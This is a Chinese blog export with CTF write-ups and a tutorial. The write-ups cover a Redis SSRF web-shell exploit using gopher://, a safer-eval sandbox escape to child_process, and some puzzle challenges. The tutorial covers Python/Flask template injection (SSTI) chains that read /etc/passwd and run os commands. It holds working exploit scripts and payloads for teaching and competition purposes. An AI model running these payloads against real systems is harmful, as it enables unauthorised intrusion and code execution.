<p>跑出结果4 5 6 7 10 11</p>
<p>一个一个试，11的时候给出了提示。</p>
<p>然后用burp爆破端口</p>
<img src="http://img.kawhi.xyz/image-20200527114920600.png" style="high:80%;width:80%;" />

<p>payloads选numbers爆破1到65535端口，线程选1。</p>
<p>爆破出结果6374。</p>
<p>因为输入url这里只限制了<code>file://</code>，没有ban掉<code>gopher://</code>，很容易想到是Redis SSRF getshell。</p>
<p>直接用exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>直接打进去。</p>
<p>在根目录下生成个文件shell.php，访问即可得到flag。</p>
<h4 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a><strong>EZ三剑客-EzNode</strong></h4><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const bodyParser = require(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const saferEval = require(<span class="string">&#x27;safer-eval&#x27;</span>); // <span class="number">2019.7</span>/WORKER1 找到一个很棒的库</span><br><span class="line"></span><br><span class="line">const fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">// <span class="number">2020.1</span>/WORKER2 老板说为了后期方便优化</span><br><span class="line">app.use((req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    let delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    console.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(() =&gt; next(), delay);</span><br><span class="line">    // <span class="number">2020.1</span>/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      console.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  let response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(String(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.10</span>/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.12</span>/WORKER3 为了方便我自己查看版本，加上这个接口</span><br><span class="line">app.get(<span class="string">&#x27;/version&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li><strong>setTimeout</strong> </li>
</ul>
<p>整数溢出，Infinity或者 大于 2147483647</p>
<p>然后get传参即可。</p>
<ul>
<li><strong>safeeval</strong></li>
</ul>
<p>RCE地址：<a class="foo" href="https://github.com/commenthol/safer-eval/issues/10" target="_blank">传送门</a></p>
<p>payload(post提交)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=setInterval.constructor(<span class="string">&#x27;return process&#x27;</span>)().mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag&#x27;</span>).toString();</span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200601151723022.png" style="high:80%;width:80%;" />

<h4 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a><strong>Pokémon</strong></h4><p>下载得到一个gba文件，用<code>VisualBoyAdvance</code>打开，玩游戏即可得到flag。</p>
<h4 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a><strong>code obfuscation</strong></h4><p>得到一张残缺的二维码图片</p>
<p>然后在这个网站上面修补：<a class="foo" href="https://merricx.github.io/qrazybox/" target="_blank">传送门</a></p>
<p>或者使用ps修复也行</p>
<img src="http://img.kawhi.xyz/image-20200601172717498.png" style="high:50%;width:50%;" />

<p>扫二维码得gkctf，再base58解密得到压缩包密码CfjxaPF。</p>
<h4 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a><strong>Harley Quinn</strong></h4><p>得到一段音频，最后面有拨号音，剪切之后丢到dtmf里面。</p>
<p>解得#222833344477773338866# 根据hint九键输出ctfisfun。</p>
<p>下载hint所说的软件, FreeFileCamouflage。</p>
<img src="http://img.kawhi.xyz/image-20200601182225212.png" style="high:80%;width:80%;" />

<p>输入密钥和图片地址得到flag。</p>
<h4 id="Sail-a-boat-down-the-river"><a href="#Sail-a-boat-down-the-river" class="headerlink" title="Sail a boat down the river"></a><strong>Sail a boat down the river</strong></h4><p>下载得一个flag.mp4有一帧是二维码，然后扫描得到一个网盘链接，但是没有提取码，根据视频里的摄像头闪光长短转换成<code>摩斯密码</code>。解码得<code>yw8g</code>。</p>
<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="number">1</span> <span class="number">7</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> <span class="number">2</span> <span class="number">0</span> <span class="number">6</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">4</span> <span class="number">0</span> <span class="number">6</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">2</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> <span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">9</span> <span class="number">2</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">9</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">1</span> <span class="number">0</span> <span class="number">8</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">8</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">7</span> <span class="number">4</span> <span class="number">6</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">密文:</span><br><span class="line">efb851bdc71d72b9ff668bddd30fd6bd</span><br><span class="line">密钥:</span><br><span class="line">第一列九宫格从左到右从上到下</span><br></pre></td></tr></table></figure>

<p>在这个网站可以自动求解数独：<a class="foo" href="http://www.llang.net/sudoku/calsudoku.html" target="_blank">传送门</a></p>
<p>得到密钥<code>52693795149137</code>。</p>
<img src="http://img.kawhi.xyz/image-20200601185426514.png" style="high:80%;width:80%;" />

<p>然后求得压缩包密码<code>GG0kc.tf</code>，解压得到<code>逆光 vocal.ovex</code>文件。使用<code>Overture 5</code>打谱软件打开，在歌词里看到flag。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>Python SSIT学习</title>
    <url>/2020/08/07/Python%20SSIT%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>学习一波模板注入，参考：</p>
<p><a class="foo" target="_blank" href="https://xz.aliyun.com/t/6885#toc-0">Python模板注入(SSTI)深入学习</a></p>
<h1 id="什么是SSIT"><a href="#什么是SSIT" class="headerlink" title="什么是SSIT"></a><strong>什么是SSIT</strong></h1><blockquote>


举一个例子

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

在上述代码中，直接将用户可控参数`request.args.get('404_url')`在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。

<img src="http://img.kawhi.xyz/image-20200807151918090.png" style="high:80%;width:80%;" />

可以看到，页面直接返回了81而不是{{9*9}}

> 
</blockquote>
<h1 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a><strong>常见的魔术方法</strong></h1><ul>
<li><code>__class__</code></li>
</ul>
<p>用于返回该对象所属的类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">o = class1()</span><br><span class="line"></span><br><span class="line">print(o.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所直接继承的类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__bases__)</span><br><span class="line"><span class="comment">#(&lt;class &#x27;__main__.class1&#x27;&gt;,)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__base__</code></li>
</ul>
<p>以字符串返回一个类所直接继承的类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__base__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>获取类的所有子类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">Base1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(Base1.__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;__main__.test&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__mro__</code></li>
</ul>
<p>返回解析方法调用的顺序。</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p>会以字典类型返回当前位置的全部模块，方法和全局变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(test.__init__.__globals__)</span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001B297C64668&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\1.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;os&#x27;: &lt;module &#x27;os&#x27; from &#x27;D:\\Python37\\lib\\os.py&#x27;&gt;, &#x27;var&#x27;: 2333, &#x27;fun&#x27;: &lt;function fun at 0x000001B297C1C1E0&gt;, &#x27;test&#x27;: &lt;class &#x27;__main__.test&#x27;&gt;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="构造链思路"><a href="#构造链思路" class="headerlink" title="构造链思路"></a><strong>构造链思路</strong></h1><p>思路如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>先使用该payload来获取某个类，这里可以获取到的是str类，实际上获取到任何类都可以，因为我们都最终目的是要获取到基类Object。</p>
<p>接下来我们可以通过<strong>bases</strong>或者<strong>mro</strong>来获取到object基类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来获取其所有子类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ... ,&lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<p>我们只需要寻找可能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。</p>
<h2 id="file对象任意读取文件"><a href="#file对象任意读取文件" class="headerlink" title="file对象任意读取文件"></a><strong>file对象任意读取文件</strong></h2><ul>
<li>python3中已经移除了file，所以这种方法只能在python2中使用</li>
</ul>
<p>file是在子类列表的第41个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__base__.__subclasses__()[<span class="number">40</span>])</span><br><span class="line"><span class="comment">#&lt;type &#x27;file&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用dir查看file对象中的内置方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(dir(().__class__.__base__.__subclasses__()[<span class="number">40</span>]))</span><br><span class="line"><span class="comment">#[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__doc__&#x27;, &#x27;__enter__&#x27;, &#x27;__exit__&#x27;, &#x27;__format__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__iter__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;close&#x27;, &#x27;closed&#x27;, &#x27;encoding&#x27;, &#x27;errors&#x27;, &#x27;fileno&#x27;, &#x27;flush&#x27;, &#x27;isatty&#x27;, &#x27;mode&#x27;, &#x27;name&#x27;, &#x27;newlines&#x27;, &#x27;next&#x27;, &#x27;read&#x27;, &#x27;readinto&#x27;, &#x27;readline&#x27;, &#x27;readlines&#x27;, &#x27;seek&#x27;, &#x27;softspace&#x27;, &#x27;tell&#x27;, &#x27;truncate&#x27;, &#x27;write&#x27;, &#x27;writelines&#x27;, &#x27;xreadlines&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>直接调用里面的方法进行读取文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines())</span><br></pre></td></tr></table></figure>

<h2 id="内置模块执行任意命令"><a href="#内置模块执行任意命令" class="headerlink" title="内置模块执行任意命令"></a><strong>内置模块执行任意命令</strong></h2><blockquote>


- 该方法也只能在python2中使用

我们知道`__globals__`能够返回当前引用的所有模块和变量，如果某个类引用了OS模块那就可能能够执行命令。

这里有一个脚本，先遍历所有子类，然后遍历子类的方法的所引用的东西的key也就是键名，来搜索是否调用了os。

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site._Printer&#x27;&gt;, 69)</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site.Quitter&#x27;&gt;, 74)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

然后直接使用

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">69</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">74</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br></pre></td></tr></table></figure>

如果是上面flask的例子

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

直接去爆破375这个数也可以。

> 
</blockquote>
<h2 id="builtins-代码执行"><a href="#builtins-代码执行" class="headerlink" title="__builtins__代码执行"></a><strong><code>__builtins__</code>代码执行</strong></h2>

这种的话，python2，3都可以使用。

思路如下：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(dir(__builtins__))</span><br></pre></td></tr></table></figure>

同样查找globals中含有的`__builtins__`

